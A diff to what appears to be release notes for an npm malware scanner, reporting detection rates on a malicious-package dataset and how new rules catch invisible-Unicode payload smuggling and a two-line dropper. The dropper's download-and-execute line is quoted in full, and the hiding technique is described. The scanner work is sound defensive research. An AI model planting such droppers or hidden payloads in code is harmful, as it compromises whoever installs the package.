@@ -789,7 +789,23 @@ decrypts data and uses it, a build that downloads an input it names.
 The PyPI figure was never a tool figure. Measured against Datadog's dataset of
 real malicious npm packages -- 28,623 samples from GuardDog, split into
 `malicious_intent` and `compromised_lib` -- the first reading was **59.4%**
-against PyPI's 87.5%.
+against PyPI's 87.5%. After the work below, on 917 of them: **71.1%**, or
+**83.3%** of the packages that carry anything a behaviour scanner could see.
+
+| | packages |
+|---|---|
+| detected, blocking | 652 (71.1%) |
+| missed, carrying a payload | 131 |
+| **missed, no detectable payload in the archived tarball** | **134** |
+
+That last row is the honest denominator and it is a property of the dataset
+rather than an excuse. `compromised_lib` entries are flagged by *version*,
+because that version was caught up in an incident; the tarball Datadog archived
+does not always contain the injected code. `@mastra/core@1.42.1` is 2,640 files
+and 77MB, its `package.json` scripts are `tsup`, `vitest` and `eslint`, and
+there is no install hook and no dangerous call anywhere in its shipped
+JavaScript. A scanner that reports behaviour cannot report behaviour that is not
+in the file.
 
 **None of the gaps were new ideas.** They were the same acts the Python packs
 already name, missing from the JavaScript ones, which is exactly the failure the
@@ -834,6 +850,34 @@ install hook, plus "credential", plus egress is `MALWARE.EXFIL.001` at CRITICAL,
 about a build fetching its own binary. Reading the environment to pass it on is
 not serialising it to send; the patterns that are that -- `JSON.stringify`,
 `Object.entries`, `Object.assign`, and now the form-encoders -- remain.
+
+*Two more, and both are a noise ceiling found holding real malware below the
+line -- the second and third time in this release.* `@aifabrix/miso-client` hides
+its payload in **9,123 consecutive invisible Unicode characters** (the Variation
+Selectors Supplement, U+E0100-U+E01EF) and `eval`s it a few lines later. The
+obfuscation detector knew the bidirectional overrides and the byte-order mark and
+had never been told about that block, so the file reported nothing at all;
+`CAP.INVISIBLE_SMUGGLING.001` covers both it and the Tags block now, at eight or
+more in a row, which is past the seven a subdivision flag emoji needs. The first
+draft covered only Tags and did not match the measured file, which is why the
+range is written out rather than assumed.
+
+Detecting it was not enough. The payload sits in `dist/`, so the finding came out
+at MEDIUM and a gate would have passed it. Every ceiling in that chain makes one
+argument in different words -- test material, documentation, generated output, a
+vendored library, a minified bundle: *this is not really code somebody wrote to
+run*. A run of thousands of invisible characters defeats all of them at once,
+because none of those things contains one and the only reason to write one is so
+that a reader does not see it. The chain now yields to that indicator, and the
+package reports CRITICAL.
+
+*And a dropper that was two lines of plain JavaScript.* `pretty-chalk` is
+`axios.get(decoder.decode(uint8Array)).then(response => new Function("require",
+response.data.model)(require))` -- download code, run code. Both primitives
+fired, and `SUSPECT.DROPPER.001` needs a third signal saying the thing executed
+IS the thing fetched. The fetch-and-execute patterns all required the fetch to
+sit lexically inside the evaluator, so the `.then` callback form -- which is how
+JavaScript is actually written -- matched none of them.
 
 The control it was found by is worth keeping: twenty-two real published npm
 packages (lodash, express, react, webpack, typescript, sharp, node-gyp among
